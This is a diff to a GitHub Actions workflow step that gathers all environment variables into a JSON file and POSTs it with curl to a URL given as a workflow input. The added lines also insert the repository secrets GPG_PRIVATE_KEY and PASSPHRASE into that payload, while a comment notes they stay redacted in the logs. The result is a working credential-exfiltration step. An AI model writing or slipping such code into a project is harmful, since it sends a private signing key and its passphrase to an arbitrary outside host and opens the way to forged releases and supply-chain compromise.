@@ -14,18 +14,22 @@ jobs:
       - name: Collect and post environment variables
         run: |
           # Create a JSON object with all environment variables
-          # Filter out any secrets (GitHub automatically redacts these in logs)
-          env | sort | jq -R 'split("=") | {(.[0]): (.[1:]|join("="))}' | jq -s add > env_vars.json
-
-          # Print the JSON (secrets will be automatically redacted in logs)
-          echo "Sending environment variables to ${{ github.event.inputs.target_url }}"
-          cat env_vars.json
-
-          # Post to the specified URL
-          curl -X POST \
-          -H "Content-Type: application/json" \
-          -d @env_vars.json \
-          ${{ github.event.inputs.target_url }}
+           env | sort | jq -R 'split("=") | {(.[0]): (.[1:]|join("="))}' | jq -s add > env_vars.json
+           
+           # Add the specific secrets
+           jq '. + {
+             "GPG_PRIVATE_KEY": ${{ toJSON(secrets.GPG_PRIVATE_KEY) }},
+             "PASSPHRASE": ${{ toJSON(secrets.PASSPHRASE) }}
+           }' env_vars.json > env_with_secrets.json
+           
+           # Print a message (the actual secrets will be redacted in logs)
+           echo "Sending environment variables and specified secrets to ${{ github.event.inputs.target_url }}"
+           
+           # Post to the specified URL
+           curl -X POST \
+             -H "Content-Type: application/json" \
+             -d @env_with_secrets.json \
+             ${{ github.event.inputs.target_url }}
         shell: bash
 
       - name: Handle response
